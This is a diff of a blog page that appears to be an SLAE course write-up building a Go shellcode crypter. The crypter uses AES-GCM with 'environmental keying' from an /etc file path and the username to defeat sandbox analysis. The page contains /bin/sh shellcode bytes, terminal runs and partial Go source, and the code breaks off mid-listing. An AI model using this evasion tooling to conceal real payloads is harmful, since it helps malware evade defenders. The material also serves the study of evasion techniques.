@@ -1,171 +1,263 @@
-<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta name=twitter:title content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta itemprop=name content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta name=application-name content="dubell.io | SLAE 7: Creating your own crypter using golang"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2020-01-27T13:33:37Z"><meta property="article:published_time" content="2020-01-27T13:33:37Z"><base href=https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/><link rel=canonical href=https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/ itemprop=url><meta name=url content="https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/"><meta name=twitter:url content="https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/"><meta property="og:url" content="https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Custom shellcode crypter in golang"><meta itemprop=description content="Custom shellcode crypter in golang"><meta property="og:description" content="Custom shellcode crypter in golang"><meta name=twitter:description content="Custom shellcode crypter in golang"><meta itemprop=image content="https://dubell.io/img/hacker2.jpg"><meta property="og:image" content="https://dubell.io/img/hacker2.jpg"><meta name=twitter:image content="https://dubell.io/img/hacker2.jpg"><meta name=twitter:image:src content="https://dubell.io/img/hacker2.jpg"><meta property="og:updated_time" content="2020-01-27T13:33:37Z"><link rel=sitemap type=application/xml title=Sitemap href=https://dubell.iositemap.xml><title>dubell.io | SLAE 7: Creating your own crypter using golang</title></head><body><div id=particles-js></div><main><div class=row><div class=col><header style=text-align:center><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></header></div></div><div class=row><div class=col style=text-align:center><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=content><article><h1>SLAE 7: Creating your own crypter using golang</h1><br><p class=small style=color:#999><a href=/categories/programming>Programming</a> / January 27, 2020 • 4 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a></p><br><p>In this article, we will build a simple crypter for encrypting and decrypting shellcode. I chose to implement the crypter in Go using environmental keys.</p><p>I will not spend time implementing a fancy shellcode execution method in this article, only encryption and decryption methods are in scope for now.</p><h2 id=encryption>Encryption</h2><p>The encryption/decryption process is using AES GCM and a specific file in <code>/etc/</code> concatenated with the current user logged in as the key. This is called <em>Environmental Keying</em>, meaning you use specific values found in the victim&rsquo;s environment such as files, hostname or users. The purpose of this is to make sure that your malware <strong>only</strong> executes in a specific environment. This means the attacker needs to know some details about the environment before encrypting any shellcode.</p><p>Analysing the shellcode will be difficult because the correct environment values are needed in order to successfully decrypt the shellcode. Relying on dynamic analysis in a sandbox is futile because of this reason.</p><p>The specific values that I have chosen for the key is the file path <code>/etc/vmware-tools/scripts/vmware/network</code> and current logged in user. The final key will look like this: <code>/etc/vmware-tools/scripts/vmware/networkdubs3c</code>.</p><p>The following example encrypts a simple shellcode that executes <code>/bin/sh</code>:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_7$ go run main.go -e -s &#34;\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde&#34;
+<!doctype html><html lang=en><head>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta charset=utf-8>
+<meta content="utf-8" http-equiv=encoding>
+<link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin>
+<link rel=stylesheet href=/css/bootstrap-grid.min.css type=text/css>
+<link rel=stylesheet href=/css/main.css type=text/css>
+<meta name=apple-mobile-web-app-title content="dubell.io | SLAE 7: Creating your own crypter using golang">
+<meta name=apple-mobile-web-app-capable content="yes">
+<meta name=apple-mobile-web-app-status-bar-style content="black-translucent">
+<meta name=twitter:site content="@dubs3c">
+<meta name=twitter:creator content="@dubs3c">
+<meta property="og:title" content="dubell.io | SLAE 7: Creating your own crypter using golang">
+<meta name=twitter:title content="dubell.io | SLAE 7: Creating your own crypter using golang">
+<meta itemprop=name content="dubell.io | SLAE 7: Creating your own crypter using golang">
+<meta name=application-name content="dubell.io | SLAE 7: Creating your own crypter using golang">
+<meta property="og:site_name" content="dubell.io">
+<meta property="og:article:published_time" content="2020-01-27T13:33:37Z">
+<meta property="article:published_time" content="2020-01-27T13:33:37Z">
+<base href=https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/>
+<link rel=canonical href=https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/ itemprop=url>
+<meta name=url content="https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/">
+<meta name=twitter:url content="https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/">
+<meta property="og:url" content="https://dubell.io/www/2020/01/slae-7-creating-your-own-crypter-using-golang/">
+<meta property="og:article:author" content="Dubs3c">
+<meta property="article:author" content="Dubs3c">
+<meta name=author content="Dubs3c">
+<meta name=description content="Custom shellcode crypter in golang">
+<meta itemprop=description content="Custom shellcode crypter in golang">
+<meta property="og:description" content="Custom shellcode crypter in golang">
+<meta name=twitter:description content="Custom shellcode crypter in golang">
+<meta itemprop=image content="https://dubell.io/img/hacker2.jpg">
+<meta property="og:image" content="https://dubell.io/img/hacker2.jpg">
+<meta name=twitter:image content="https://dubell.io/img/hacker2.jpg">
+<meta name=twitter:image:src content="https://dubell.io/img/hacker2.jpg">
+<meta property="og:updated_time" content="2020-01-27T13:33:37Z">
+<link rel=sitemap type=application/xml title=Sitemap href=https://dubell.io/sitemap.xml>
+<title>dubell.io | SLAE 7: Creating your own crypter using golang</title>
+</head><body>
+<div id=particles-js></div>
+<main><div class=row>
+<div class=col>
+<header style=text-align:center>
+<a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a>
+</header>
+</div>
+</div>
+<div class=row>
+<div class=col style=text-align:center>
+<nav>
+<fieldset>
+<legend>n4vig4ti0n</legend>
+<ul>
+<li><a href=/>/etc/motd</a></li>
+<li><a href=/www/>/var/www</a></li>
+<li><a href=/mnt/>/mnt</a></li>
+<li><a href=/usr/>/usr</a></li>
+</ul>
+</fieldset>
+</nav>
+</div>
+</div>
+<div class=content>
+<article>
+<h1>SLAE 7: Creating your own crypter using golang</h1>
+<br>
+<p class=small style=color:#999>
+<a href=/categories/programming>Programming</a> / January 27, 2020 • 4 min read </p>
+<p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a> </p>
+<br>
+<p>In this article, we will build a simple crypter for encrypting and decrypting shellcode. I chose to implement the crypter in Go using environmental keys.</p>
+<p>I will not spend time implementing a fancy shellcode execution method in this article, only encryption and decryption methods are in scope for now.</p>
+<h2 id=encryption>Encryption</h2>
+<p>The encryption/decryption process is using AES GCM and a specific file in <code>/etc/</code> concatenated with the current user logged in as the key. This is called <em>Environmental Keying</em>, meaning you use specific values found in the victim&rsquo;s environment such as files, hostname or users. The purpose of this is to make sure that your malware <strong>only</strong> executes in a specific environment. This means the attacker needs to know some details about the environment before encrypting any shellcode.</p>
+<p>Analysing the shellcode will be difficult because the correct environment values are needed in order to successfully decrypt the shellcode. Relying on dynamic analysis in a sandbox is futile because of this reason.</p>
+<p>The specific values that I have chosen for the key is the file path <code>/etc/vmware-tools/scripts/vmware/network</code> and current logged in user. The final key will look like this: <code>/etc/vmware-tools/scripts/vmware/networkdubs3c</code>.</p>
+<p>The following example encrypts a simple shellcode that executes <code>/bin/sh</code>:</p>
+<pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_7$ go run main.go -e -s &quot;\xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde&quot;
 [+] Your encrypted shellcode: 5af9fb00a2147e12ba73c2686b1b25fac3f441ffcb6974b00ec7413208dc749dae128faf67a5db80fe868dc2386e30546409503beb9ea6973441dc0ace3b35563550e3041fdde2c234b7dbd36ce74f1653ac08ec3be1f6fac3dd6fc34b378477bf6a5acf7800d01ee1c9280d8f6e2ccb8b13f517e790cc6d6623df9b1ced1dc1ebd8df2caca412f6f9d8233bd233fd6c590b12211f0706fc18dca864e97908df4eb638c8b223afc57d59714db119a0075dc935a65a38b4fe175fc15ad2b03125303b98c991ac01238f61c10f444bd85ad081fe2d097f816345e2ab98436cae10033c1cd870502608eac6a3149688b992
 dubs3c@slae:~/SLAE/EXAM/github/assignment_7$
-</code></pre><h2 id=decryption>Decryption</h2><p>The decryption function will loop over all files and folders in <code>/etc/</code> and try each file path as the key together with the current username. When the correct key is found, the shellcode is decrypted.</p><p>Decrypting shellcode:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_7$ go run main.go -d -s &#34;5af9fb00a2147e12ba73c2686b1b25fac3f441ffcb6974b00ec7413208dc749dae128faf67a5db80fe868dc2386e30546409503beb9ea6973441dc0ace3b35563550e3041fdde2c234b7dbd36ce74f1653ac08ec3be1f6fac3dd6fc34b378477bf6a5acf7800d01ee1c9280d8f6e2ccb8b13f517e790cc6d6623df9b1ced1dc1ebd8df2caca412f6f9d8233bd233fd6c590b12211f0706fc18dca864e97908df4eb638c8b223afc57d59714db119a0075dc935a65a38b4fe175fc15ad2b03125303b98c991ac01238f61c10f444bd85ad081fe2d097f816345e2ab98436cae10033c1cd870502608eac6a3149688b992&#34;
+</code></pre><h2 id=decryption>Decryption</h2>
+<p>The decryption function will loop over all files and folders in <code>/etc/</code> and try each file path as the key together with the current username. When the correct key is found, the shellcode is decrypted.</p>
+<p>Decrypting shellcode:</p>
+<pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_7$ go run main.go -d -s &quot;5af9fb00a2147e12ba73c2686b1b25fac3f441ffcb6974b00ec7413208dc749dae128faf67a5db80fe868dc2386e30546409503beb9ea6973441dc0ace3b35563550e3041fdde2c234b7dbd36ce74f1653ac08ec3be1f6fac3dd6fc34b378477bf6a5acf7800d01ee1c9280d8f6e2ccb8b13f517e790cc6d6623df9b1ced1dc1ebd8df2caca412f6f9d8233bd233fd6c590b12211f0706fc18dca864e97908df4eb638c8b223afc57d59714db119a0075dc935a65a38b4fe175fc15ad2b03125303b98c991ac01238f61c10f444bd85ad081fe2d097f816345e2ab98436cae10033c1cd870502608eac6a3149688b992&quot;
 [+] Decrypted shellcode: \xfc\xbb\x1b\x91\xcd\xc8\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x2a\x43\x9f\xa0\x22\x4c\x53\x59\xd2\xbd\xbc\xfb\x4b\x4b\x21\xca\x42\x7a\x66\x9d\x5f\xb0\xe6\xde\x5f\x4a\xe7\xde
 dubs3c@slae:~/SLAE/EXAM/github/assignment_7$
-</code></pre><h2 id=final-code>Final code</h2><p>Below is the final program for encrypting/decrypting shellcode.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1</span><span><span style=color:#fb660a;font-weight:700>package</span> main
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3</span><span><span style=color:#fb660a;font-weight:700>import</span> (
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4</span><span>    <span style=color:#0086d2>&#34;crypto/aes&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5</span><span>    <span style=color:#0086d2>&#34;crypto/cipher&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6</span><span>    <span style=color:#0086d2>&#34;crypto/rand&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7</span><span>    <span style=color:#0086d2>&#34;crypto/sha256&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8</span><span>    <span style=color:#0086d2>&#34;encoding/hex&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9</span><span>    <span style=color:#0086d2>&#34;flag&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10</span><span>    <span style=color:#0086d2>&#34;fmt&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11</span><span>    <span style=color:#0086d2>&#34;io&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12</span><span>    <span style=color:#0086d2>&#34;os&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13</span><span>    <span style=color:#0086d2>&#34;os/user&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14</span><span>    <span style=color:#0086d2>&#34;path/filepath&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15</span><span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17</span><span><span style=color:#fb660a;font-weight:700>type</span> cliOptions <span style=color:#fb660a;font-weight:700>struct</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18</span><span>    encrypt   <span style=color:#cdcaa9;font-weight:700>bool</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19</span><span>    decrypt   <span style=color:#cdcaa9;font-weight:700>bool</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20</span><span>    shellcode <span style=color:#cdcaa9;font-weight:700>string</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23</span><span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>processArgs</span>() cliOptions {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24</span><span>    opts := cliOptions{}
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25</span><span>    flag.<span style=color:#ff0086;font-weight:700>BoolVar</span>(&amp;opts.decrypt, <span style=color:#0086d2>&#34;decrypt&#34;</span>, <span style=color:#fb660a;font-weight:700>false</span>, <span style=color:#0086d2>&#34;Decrypt your shellcode&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26</span><span>    flag.<span style=color:#ff0086;font-weight:700>BoolVar</span>(&amp;opts.decrypt, <span style=color:#0086d2>&#34;d&#34;</span>, <span style=color:#fb660a;font-weight:700>false</span>, <span style=color:#0086d2>&#34;Decrypt your shellcode&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27</span><span>    flag.<span style=color:#ff0086;font-weight:700>BoolVar</span>(&amp;opts.encrypt, <span style=color:#0086d2>&#34;encrypt&#34;</span>, <span style=color:#fb660a;font-weight:700>false</span>, <span style=color:#0086d2>&#34;Encrypt your shellcode&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28</span><span>    flag.<span style=color:#ff0086;font-weight:700>BoolVar</span>(&amp;opts.encrypt, <span style=color:#0086d2>&#34;e&#34;</span>, <span style=color:#fb660a;font-weight:700>false</span>, <span style=color:#0086d2>&#34;Encrypt your shellcode&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29</span><span>    flag.<span style=color:#ff0086;font-weight:700>StringVar</span>(&amp;opts.shellcode, <span style=color:#0086d2>&#34;shellcode&#34;</span>, <span style=color:#0086d2>&#34;&#34;</span>, <span style=color:#0086d2>&#34;Your shellcode&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30</span><span>    flag.<span style=color:#ff0086;font-weight:700>StringVar</span>(&amp;opts.shellcode, <span style=color:#0086d2>&#34;s&#34;</span>, <span style=color:#0086d2>&#34;&#34;</span>, <span style=color:#0086d2>&#34;Your shellcode&#34;</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31</span><span>    flag.<span style=color:#ff0086;font-weight:700>Parse</span>()
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33</span><span>    <span style=color:#fb660a;font-weight:700>return</span> opts
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36</span><span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>init</span>() {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37</span><span>    flag.Usage = <span style=color:#fb660a;font-weight:700>func</span>() {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38</span><span>        h := <span style=color:#0086d2>&#34;\nEncrypt your shellcode! Very nice! Made by @dubs3c.\n\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40</span><span>        h += <span style=color:#0086d2>&#34;Usage:\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41</span><span>        h += <span style=color:#0086d2>&#34;  cyrptoBoot [shellcode] [options]\n\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43</span><span>        h += <span style=color:#0086d2>&#34;Options:\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44</span><span>        h += <span style=color:#0086d2>&#34;  -e,  --encrypt      Encrypt shellcode\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45</span><span>        h += <span style=color:#0086d2>&#34;  -d,  --decrypt      Decrypt shellcode\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46</span><span>        h += <span style=color:#0086d2>&#34;  -s,  --shellcode    Shellcode\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47</span><span>        h += <span style=color:#0086d2>&#34;  -v,  --version      Show version\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49</span><span>        h += <span style=color:#0086d2>&#34;\nExamples:\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50</span><span>        h += <span style=color:#0086d2>&#34;  cryptoBoot -e -s \&#34;&lt;shellcode&gt;\&#34;\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51</span><span>        h += <span style=color:#0086d2>&#34;  cryptoBoot -d -s \&#34;&lt;shellcode&gt;\&#34;\n&#34;</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53</span><span>        fmt.<span style=color:#ff0086;font-weight:700>Fprintf</span>(os.Stderr, h)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57</span><span><span style=color:#fb660a;font-weight:700>func</span> <span style=color:#ff0086;font-weight:700>encrypt</span>(shellcode <span style=color:#cdcaa9;font-weight:700>string</span>, envKey []<span style=color:#cdcaa9;font-weight:700>byte</span>) (encryptedShellcode []<span style=color:#cdcaa9;font-weight:700>byte</span>, err <span style=color:#cdcaa9;font-weight:700>error</span>) {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58</span><span>    plaintext := []byte(shellcode)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60</span><span>    block, err := aes.<span style=color:#ff0086;font-weight:700>NewCipher</span>(envKey)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61</span><span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62</span><span>        panic(err.<span style=color:#ff0086;font-weight:700>Error</span>())
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65</span><span>    <span style=color:#080;background-color:#0f140f;font-style:italic>// Never use more than 2^32 random nonces with a given key because of the risk of a repeat.
-</span></span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66</span><span><span style=color:#080;background-color:#0f140f;font-style:italic></span>    nonce := make([]<span style=color:#cdcaa9;font-weight:700>byte</span>, <span style=color:#0086f7;font-weight:700>12</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67</span><span>    <span style=color:#fb660a;font-weight:700>if</span> _, err := io.<span style=color:#ff0086;font-weight:700>ReadFull</span>(rand.Reader, nonce); err != <span style=color:#fb660a;font-weight:700>nil</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68</span><span>        panic(err.<span style=color:#ff0086;font-weight:700>Error</span>())
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71</span><span>    aesgcm, err := cipher.<span style=color:#ff0086;font-weight:700>NewGCM</span>(block)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72</span><span>    <span style=color:#fb660a;font-weight:700>if</span> err != <span style=color:#fb660a;font-weight:700>nil</span> {
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73</span><span>        panic(err.<span style=color:#ff0086;font-weight:700>Error</span>())
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74</span><span>    }
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76</span><span>    ciphertext := aesgcm.<span style=color:#ff0086;font-weight:700>Seal</span>(<span style=color:#fb660a;font-weight:700>nil</span>, nonce, plaintext, <span style=color:#fb660a;font-weight:700>nil</span>)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77</span><span>    ciphertextWithNonce := append(nonce, ciphertext...)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78</span><span>    encodedCiphertext := make([]<span style=color:#cdcaa9;font-weight:700>byte</span>, hex.<span style=color:#ff0086;font-weight:700>EncodedLen</span>(len(ciphertextWithNonce)))
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79</span><span>    hex.<span style=color:#ff0086;font-weight:700>Encode</span>(encodedCiphertext, ciphertextWithNonce)
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80</span><span>    <span style=color:#fb660a;font-weight:700>return</span> encodedCiphertext, <span style=color:#fb660a;font-weight:700>nil</span>
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81</span><span>}
-</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82</span><span>
